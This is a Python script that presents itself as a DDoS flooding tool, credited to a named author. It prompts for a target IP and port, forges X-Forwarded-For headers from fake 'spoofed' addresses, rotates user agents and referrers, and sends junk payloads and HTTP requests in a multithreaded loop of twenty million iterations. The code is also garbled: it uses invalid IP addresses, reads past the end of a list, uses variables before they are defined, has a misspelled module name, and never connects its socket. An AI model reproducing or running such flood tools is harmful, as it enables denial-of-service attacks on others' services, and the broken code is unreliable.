import threading 
import socket
import time as clock
import sys
import socket
import random
import requests
socks2 = [""" 193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443 """]
useragents = ["Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
"Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
"Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
"Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0",
"Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)",
"Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016"]
ref= ['http://www.bing.com/search?q=',
'https://www.ndex.com/ndsearch?text=',
'https://duckduckgo.com/?q=']
def spoof1():
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 276))
    addr[1] = str(random.randrange(2, 276))
    addr[2] = str(random.randrange(3, 771))
    addr[3] = str(random.randrange(11, 276))
    addr[4] = str(random.randrange(11, 276))
    addres = addr[0] + d + addr[1] + d + addr[2] + addr[3] + d + addr[4] + "\r\n"
    return addres
    
def spoof2():
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 276))
    addr[1] = str(random.randrange(2, 276))
    addr[2] = str(random.randrange(3, 771))
    addr[3] = str(random.randrange(11, 276))
    addr[4] = str(random.randrange(11, 276))
    addres = addr[0] + d + addr[1] + d + addr[2] + addr[3] + d + addr[4] + "\r\n"
    return addres
    
def spoof3():
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 276))
    addr[1] = str(random.randrange(2, 276))
    addr[2] = str(random.randrange(3, 771))
    addr[3] = str(random.randrange(11, 276))
    addr[4] = str(random.randrange(11, 276))
    addres = addr[0] + d + addr[1] + d + addr[2] + addr[3] + d + addr[4] + "\r\n"
    return addres

byte1 = random._urandom(1024)
tp = """This Ddos Credit:ZanGanteng"""

def TCP():
  global byte1, useragents, socks2, ref
  global time
  ip = str(input("Enter <>> IP >>"))
  port = int(input("Enter <>> IP >>"))
  connection += "Cache-Control: max-age=0\r\n"
  connection2 = "Connection: Keep-Alive\r\n"
  connection2 += "Cache-Control: max-age=0\r\n"
  connection3 = "Connection: Keep-Alive\r\n"
  connection3 += "Cache-Control: max-age=0\r\n"
  connection += "pragma: no-cache\r\n"
  connection += "X-Forwarded-For: " + spoof1() + "\r\n"
  connection2 += "X-Forwarded-For: " + spoof2() + "\r\n"
  connection3 += "X-Forwarded-For: " + spoof3() + "\r\n"
  connect = "Connection : keep-Alive\r\n\r\n"
  Socks = random.choice(socks2)
  useralive = "UserAgents: "+random.choice(useragents)+random.choice(ref)+random.choice(Connection)+random.choice(socks2)+"\r\n"
  reffer = ranfom.choice(ref)
  get_rand = random.choice(['GET','POST',"HEAD"])
  get_host = "GET /Attacked-RR/1.1\r\nHost: " + ip + "\r\n"
  byte_ip = get_host + connect + connection + connection2 + connection3 + useralive + reffer + Socks + get_rand + "\r\n"
  for x in range(20000000):
         s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
         s.send(byte1)
         s.send(byte1)
         s.sendall(str.encode(byte_ip))
         s.sendall(str.encode(byte_ip))
         print("[SLOT IP1] REQUEST SENDED", [connection])
         print("SENDED IP1 = ", [x])
         print("[SLOT IP2] REQUEST SENDED", [connection2])
         print("SENDED IP2 = ", [x])
         print("[SLOT IP3] REQUEST SENDED", [connection3])
         print("SENDED IP3 = ", [x])
TCP()
for x in range(port):
  th1 = threading.Thread(target=TCP)
  th1.start()